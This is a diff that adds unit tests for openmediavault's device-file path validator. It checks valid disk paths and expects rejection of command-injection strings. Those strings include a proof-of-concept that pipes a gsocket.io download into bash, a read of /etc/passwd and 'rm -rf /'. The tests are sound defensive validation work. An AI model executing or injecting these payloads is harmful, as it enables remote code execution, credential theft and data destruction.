@@ -64,6 +64,201 @@ class SchemaTestCase(unittest.TestCase):
             "field1",
         )
 
+    def test_check_format_devicefile_sata(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format("/dev/sda", {"format": "devicefile"}, "field1")
+
+    def test_check_format_devicefile_sata_partition(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format("/dev/sdb2", {"format": "devicefile"}, "field1")
+
+    def test_check_format_devicefile_nvme(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format(
+            "/dev/nvme0n1", {"format": "devicefile"}, "field1")
+
+    def test_check_format_devicefile_nvme_partition(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format(
+            "/dev/nvme0n1p1", {"format": "devicefile"}, "field1")
+
+    def test_check_format_devicefile_mmc(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format(
+            "/dev/mmcblk0", {"format": "devicefile"}, "field1")
+
+    def test_check_format_devicefile_mmc_partition(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format(
+            "/dev/mmcblk0p1", {"format": "devicefile"}, "field1")
+
+    def test_check_format_devicefile_md_raid(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format("/dev/md0", {"format": "devicefile"}, "field1")
+
+    def test_check_format_devicefile_md_raid_subdir(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format("/dev/md/0", {"format": "devicefile"}, "field1")
+
+    def test_check_format_devicefile_device_mapper(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format("/dev/dm-0", {"format": "devicefile"}, "field1")
+
+    def test_check_format_devicefile_lvm(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format("/dev/mapper/data-lv",
+                             {"format": "devicefile"}, "field1")
+
+    def test_check_format_devicefile_virtio(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format("/dev/vda1", {"format": "devicefile"}, "field1")
+
+    def test_check_format_devicefile_loop(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format("/dev/loop0", {"format": "devicefile"}, "field1")
+
+    def test_check_format_devicefile_by_id_ata(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format(
+            "/dev/disk/by-id/ata-WDC_WD20EARX-00PASB0_WD-WMAZA2048027",
+            {"format": "devicefile"},
+            "field1",
+        )
+
+    def test_check_format_devicefile_by_uuid(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format(
+            "/dev/disk/by-uuid/113dbaac-e496-11e6-ac68-73bc0f572bae",
+            {"format": "devicefile"},
+            "field1",
+        )
+
+    def test_check_format_devicefile_by_id_md_name(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format(
+            "/dev/disk/by-id/md-name-vmpc01:data",
+            {"format": "devicefile"},
+            "field1",
+        )
+
+    def test_check_format_devicefile_by_id_md_uuid(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format(
+            "/dev/disk/by-id/md-uuid-75de9de9:6beca92e:8442575c:73eabbc9",
+            {"format": "devicefile"},
+            "field1",
+        )
+
+    def test_check_format_devicefile_by_path(self):
+        schema = openmediavault.datamodel.Schema({})
+        schema._check_format(
+            "/dev/disk/by-path/pci-0000:00:10.0-scsi-0:0:0:0",
+            {"format": "devicefile"},
+            "field1",
+        )
+
+    def test_check_format_devicefile_fail_semicolon_injection(self):
+        schema = openmediavault.datamodel.Schema({})
+        self.assertRaises(
+            openmediavault.json.SchemaValidationException,
+            lambda: schema._check_format(
+                "/dev/sda; id", {"format": "devicefile"}, "field1"
+            ),
+        )
+
+    def test_check_format_devicefile_fail_rce_poc(self):
+        schema = openmediavault.datamodel.Schema({})
+        self.assertRaises(
+            openmediavault.json.SchemaValidationException,
+            lambda: schema._check_format(
+                '/dev/sda; GS_WEBHOOK_KEY=af946780 bash -c "$(curl -fsSL https://gsocket.io/x)"',
+                {"format": "devicefile"},
+                "field1",
+            ),
+        )
+
+    def test_check_format_devicefile_fail_pipe_injection(self):
+        schema = openmediavault.datamodel.Schema({})
+        self.assertRaises(
+            openmediavault.json.SchemaValidationException,
+            lambda: schema._check_format(
+                "/dev/sda | cat /etc/passwd", {
+                    "format": "devicefile"}, "field1"
+            ),
+        )
+
+    def test_check_format_devicefile_fail_and_injection(self):
+        schema = openmediavault.datamodel.Schema({})
+        self.assertRaises(
+            openmediavault.json.SchemaValidationException,
+            lambda: schema._check_format(
+                "/dev/sda && rm -rf /", {"format": "devicefile"}, "field1"
+            ),
+        )
+
+    def test_check_format_devicefile_fail_subshell_injection(self):
+        schema = openmediavault.datamodel.Schema({})
+        self.assertRaises(
+            openmediavault.json.SchemaValidationException,
+            lambda: schema._check_format(
+                "/dev/sda$(id)", {"format": "devicefile"}, "field1"
+            ),
+        )
+
+    def test_check_format_devicefile_fail_backtick_injection(self):
+        schema = openmediavault.datamodel.Schema({})
+        self.assertRaises(
+            openmediavault.json.SchemaValidationException,
+            lambda: schema._check_format(
+                "/dev/sda`id`", {"format": "devicefile"}, "field1"
+            ),
+        )
+
+    def test_check_format_devicefile_fail_redirect_injection(self):
+        schema = openmediavault.datamodel.Schema({})
+        self.assertRaises(
+            openmediavault.json.SchemaValidationException,
+            lambda: schema._check_format(
+                "/dev/sda > /tmp/out", {"format": "devicefile"}, "field1"
+            ),
+        )
+
+    def test_check_format_devicefile_fail_newline_injection(self):
+        schema = openmediavault.datamodel.Schema({})
+        self.assertRaises(
+            openmediavault.json.SchemaValidationException,
+            lambda: schema._check_format(
+                "/dev/sda\nid", {"format": "devicefile"}, "field1"
+            ),
+        )
+
+    def test_check_format_devicefile_fail_variable_injection(self):
+        schema = openmediavault.datamodel.Schema({})
+        self.assertRaises(
+            openmediavault.json.SchemaValidationException,
+            lambda: schema._check_format(
+                "/dev/sda $USER", {"format": "devicefile"}, "field1"
+            ),
+        )
+
+    def test_check_format_devicefile_fail_no_dev_prefix(self):
+        schema = openmediavault.datamodel.Schema({})
+        self.assertRaises(
+            openmediavault.json.SchemaValidationException,
+            lambda: schema._check_format(
+                "sda", {"format": "devicefile"}, "field1"
+            ),
+        )
+
+    def test_check_format_devicefile_fail_wrong_path(self):
+        schema = openmediavault.datamodel.Schema({})
+        self.assertRaises(
+            openmediavault.json.SchemaValidationException,
+            lambda: schema._check_format(
+                "/etc/passwd", {"format": "devicefile"}, "field1"
+            ),
+        )
+
     def test_check_format_dirpath_1(self):
         schema = openmediavault.datamodel.Schema({})
         schema._check_format(
